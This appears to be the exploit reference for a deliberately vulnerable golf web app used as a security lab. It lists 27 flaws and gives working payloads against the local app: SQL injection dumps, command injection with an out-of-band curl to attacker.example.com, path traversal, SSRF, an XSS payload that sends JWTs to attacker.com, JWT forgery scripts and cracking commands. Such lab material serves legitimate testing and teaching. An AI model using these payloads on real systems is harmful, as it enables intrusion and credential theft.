# Vulnerability Reference

This application is **deliberately vulnerable** for security testing and demonstration purposes.
Do not deploy on production systems or public networks.

> **Stability note (2026-05-05):** All 27 vulnerabilities remain intact. Two crash-prevention
> changes were made so that exploit payloads no longer cause HTTP 500 responses before the
> vulnerability triggers:
>
> 1. **Command injection (`export.ts`)** — the score JSON is now written to a safe numeric path
>    so that `roundId` values containing `/` (e.g. `curl`/`wget` OOB URLs) no longer crash
>    `writeFileSync` before the shell command runs. The raw `roundId` is still injected into
>    the shell command unchanged.
>
> 2. **Stacked-query SQLi (`courses.ts`, `auth.ts`, `rounds.ts`)** — DML/DDL statements injected
>    via `;` return a result without a `.rows` array; optional-chaining guards (`result?.rows ?? []`)
>    prevent a `TypeError` crash while keeping all `SELECT`-based injection (UNION, boolean,
>    time-based) fully functional.

---

## Vulnerability Index

| # | Category | OWASP 2021 | Endpoint / Component | Severity |
|---|----------|-----------|---------------------|---------|
| 1 | SQL Injection (Login) | A03 | `POST /api/auth/login` | Critical |
| 2 | SQL Injection (Search) | A03 | `GET /api/courses?search=` | Critical |
| 3 | SQL Injection (Rounds UPDATE) | A03 | `PUT /api/rounds/:id` | High |
| 4 | SQL Injection (Course CREATE) | A03 | `POST /api/courses` | High |
| 5 | Command Injection | A03 | `GET /api/export/scorecard/:roundId` | Critical |
| 6 | Path Traversal | A03 | `GET /api/export/file?name=` | Critical |
| 7 | SSRF | A10 | `GET /api/courses/fetch-image?url=` | High |
| 8 | Stored XSS | A03 | Round notes, Course description, User bio | High |
| 9 | Reflected XSS | A03 | `GET /courses?search=` | High |
| 10 | IDOR — Rounds | A01 | `GET/PUT/DELETE /api/rounds/:id` | High |
| 11 | IDOR — User Profiles | A01 | `GET /api/users/:id` | High |
| 12 | Mass Assignment / Privilege Escalation | A01 | `PUT /api/users/:id` | Critical |
| 13 | Broken Admin Authentication (JWT forgery) | A07 | `POST /api/admin/login`, `GET /api/admin/*` | Critical |
| 14 | Weak JWT (none algorithm) | A07 | All authenticated endpoints | Critical |
| 15 | Weak JWT (secret key) | A02 | All authenticated endpoints | High |
| 16 | JWT in localStorage | A05 | Frontend (AuthContext) | Medium |
| 17 | MD5 Password Hashing | A02 | All user passwords | Critical |
| 18 | Password Hash Disclosure | A02 | `GET /api/users/:id` | High |
| 19 | User Enumeration | A07 | `POST /api/auth/login`, `POST /api/auth/register` | Medium |
| 20 | CORS Wildcard | A05 | All API endpoints | High |
| 21 | No Security Headers | A05 | All API endpoints | Medium |
| 22 | Verbose Error Messages | A09 | All endpoints (errorHandler) | Medium |
| 23 | Debug Endpoint | A05 | `GET /api/debug` | Critical |
| 24 | Secrets in Environment Output | A09 | Server startup logs | Medium |
| 25 | No Rate Limiting | A07 | `POST /api/auth/login` | Medium |
| 26 | CSRF (No tokens) | A01 | All state-changing endpoints | Medium |
| 27 | Insecure Direct Object Reference — Rounds ownership | A01 | `GET /api/rounds?user_id=` | Medium |

---

## Detailed Vulnerability Write-ups

---

### 1. SQL Injection — Login

**Endpoint:** `POST /api/auth/login`

**Vulnerable code** (`backend/src/routes/auth.ts`):
```sql
SELECT * FROM users WHERE email = '${email}' AND password = '${md5pwd}'
```

**Exploit — Authentication bypass:**
```bash
curl -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@golf.com'\''--", "password": "anything"}'
```
The payload `admin@golf.com'--` comments out the password check.

**Exploit — Dump all users (UNION-based):**
```
email: ' UNION SELECT id, email, password, first_name, last_name, handicap, role, bio, avatar_url, created_at FROM users--
```

---

### 2. SQL Injection — Course Search

**Endpoint:** `GET /api/courses?search=<input>&location=<input>`

**Vulnerable code** (`backend/src/routes/courses.ts`):
```sql
SELECT * FROM courses WHERE name LIKE '%${search}%' AND location LIKE '%${location}%'
```

**Exploit — UNION dump users table:**
```bash
curl "http://localhost:3001/api/courses?search=%25'%20UNION%20SELECT%201,email,password,4,5,6,7,8,NOW()%20FROM%20users--"
```

**Exploit — Time-based blind SQLi:**
```
search=' AND (SELECT pg_sleep(5))--
```

---

### 5. Command Injection — Score Export

**Endpoint:** `GET /api/export/scorecard/:roundId?format=<format>`

**Vulnerable code** (`backend/src/routes/export.ts`):
```bash
cat /exports/score_${roundId}.json > /exports/out_${roundId}.${format}
```

The JSON score file is now written to a safe numeric path (`score_<parseInt(roundId)>.json`) so
that the `writeFileSync` step does not crash when `roundId` contains `/` characters (e.g. from
`curl`/`wget` OOB payloads). The raw `roundId` is still interpolated directly into the shell
command, so command injection is fully preserved.

**Exploit — RCE via roundId (semicolon, use `#` to comment out trailing `.json`):**
```bash
curl "http://localhost:3001/api/export/scorecard/1;id%20#?format=csv" \
  -H "Authorization: Bearer <token>"
```
Response includes stdout of `id` command.

**Exploit — OOB via curl (payloads containing `/` now work without crashing):**
```bash
curl "http://localhost:3001/api/export/scorecard/1;curl%20http://attacker.example.com/%24(id)%20%23?format=csv" \
  -H "Authorization: Bearer <token>"
```

**Exploit — Read /etc/passwd via redirect:**
```bash
curl "http://localhost:3001/api/export/scorecard/1;cat%20/etc/passwd%3E/exports/out.txt;%23?format=csv" \
  -H "Authorization: Bearer <token>"
```

---

### 6. Path Traversal — File Download

**Endpoint:** `GET /api/export/file?name=<filename>`

**Vulnerable code** (`backend/src/routes/export.ts`):
```javascript
const filePath = `/exports/${name}`;
res.sendFile(filePath);
```

**Exploit:**
```bash
curl "http://localhost:3001/api/export/file?name=../../etc/passwd" \
  -H "Authorization: Bearer <token>"
```

---

### 7. SSRF — Course Image Fetch

**Endpoint:** `GET /api/courses/fetch-image?url=<url>`

No authentication required. No hostname blocklist.

**Exploit — AWS metadata:**
```bash
curl "http://localhost:3001/api/courses/fetch-image?url=http://169.254.169.254/latest/meta-data/"
```

**Exploit — Internal port scan:**
```bash
curl "http://localhost:3001/api/courses/fetch-image?url=http://db:5432"
```

**Exploit — Local file via file:// (node-fetch v2 blocks this, but worth testing):**
```bash
curl "http://localhost:3001/api/courses/fetch-image?url=file:///etc/passwd"
```

---

### 8 & 9. Cross-Site Scripting

**Stored XSS vectors:**
- Round notes: save `<script>alert(document.cookie)</script>` as round notes
- Course description: seed data includes live payloads in Augusta and St Andrews descriptions
- User bio: `<img src=x onerror="fetch('http://attacker.com/?c='+localStorage.getItem('jwt'))">`

**Reflected XSS:**
```
http://localhost:5173/courses?search=<img src=x onerror=alert(1)>
```

---

### 10. IDOR — Round Access

**Exploit — Access another user's round:**
```bash
# Login as alice (user id=2)
TOKEN=$(curl -s -X POST http://localhost:3001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com","password":"password1"}' | jq -r .token)

# Access bob's round (round id belonging to user id=3)
curl http://localhost:3001/api/rounds/4 -H "Authorization: Bearer $TOKEN"
```

---

### 12. Mass Assignment — Privilege Escalation

**Exploit — Elevate to admin:**
```bash
curl -X PUT http://localhost:3001/api/users/2 \
  -H "Authorization: Bearer <alice-token>" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'
```

**Exploit — Change another user's password (MD5 of "hacked"):**
```bash
curl -X PUT http://localhost:3001/api/users/1 \
  -H "Authorization: Bearer <any-token>" \
  -H "Content-Type: application/json" \
  -d '{"password": "5d41402abc4b2a76b9719d911017c592"}'
```

---

### 13. Broken Admin Authentication

Admin login posts credentials to `POST /api/admin/login`. The endpoint is vulnerable to SQLi (same as regular login) and issues a JWT signed with the weak secret `"secret"`. All admin routes validate that JWT but accept the `none` algorithm, so the token can be forged entirely without the secret.

**Exploit — SQLi bypass on admin login:**
```bash
curl -X POST http://localhost:3001/api/admin/login \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@golf.com'\''--", "password": "anything"}'
```

**Exploit — Forge JWT with role=admin (since secret is "secret"):**
```python
import jwt
token = jwt.encode({"id": 99, "email": "hax@evil.com", "role": "admin"}, "secret", algorithm="HS256")
# Use token to access admin endpoints via Authorization: Bearer header
```

---

### 14. JWT — None Algorithm Bypass

**Exploit — Forge token with alg:none:**
```python
import base64, json

header  = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({"id":1,"email":"admin@golf.com","role":"admin"}).encode()).rstrip(b'=').decode()
token   = f"{header}.{payload}."

# Use in Authorization header:
# Authorization: Bearer <token>
```

---

### 17. MD5 Password Hashing

All passwords are stored as MD5 hashes without salt. Crack with:
```bash
hashcat -a 0 -m 0 0192023a7bbd73250516f069df18b500 rockyou.txt
# Cracks to: admin123
```

---

### 23. Debug Endpoint — Full Environment Disclosure

**Endpoint:** `GET /api/debug` (no authentication)

```bash
curl http://localhost:3001/api/debug | jq .environment
# Returns DATABASE_URL, JWT_SECRET, NODE_ENV, etc.
```

Also available:
```bash
curl http://localhost:3001/api/debug/users
# Returns full users table including password hashes — no auth
```

---

### 20. CORS Wildcard

All responses include:
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS
Access-Control-Allow-Headers: *
```

This allows any malicious website to make authenticated requests on behalf of a logged-in user (combined with the localStorage JWT vulnerability).

---

## Seed Credentials

| Email | Password | Role | Handicap |
|-------|----------|------|---------|
| admin@golf.com | admin123 | admin | 0.0 |
| alice@example.com | password1 | user | 8.4 |
| bob@example.com | golfpro99 | user | 14.2 |
| carol@example.com | links2023 | user | 22.7 |
| dave@example.com | birdie42 | user | 5.1 |

---

## Quick Start

```bash
# Start all services
npm run dev

# Seed database
npm run seed

# Reset everything
npm run reset

# View logs
npm run logs
```
